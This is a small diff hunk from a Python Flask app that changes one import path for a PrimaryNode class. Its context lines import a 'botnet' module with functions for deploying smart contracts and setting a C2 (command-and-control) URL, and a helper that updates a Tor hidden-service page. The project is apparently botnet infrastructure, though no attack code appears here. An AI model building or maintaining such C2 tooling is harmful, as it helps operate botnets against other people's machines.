@@ -44,7 +44,7 @@ if str(PROJECT_ROOT) not in sys.path:
 
 from Ghost_Comm.update_torsite_html import update_hidden_service_html
 from botnet.blockchain_utils import compile_contract, deploy_contract, get_contract_instance, set_c2_url
-from ghost_comm_lib.node.primary_node import PrimaryNode
+from ghost_comm_lib.primary_node.primary_node import PrimaryNode
 
 app = Flask(__name__)
 
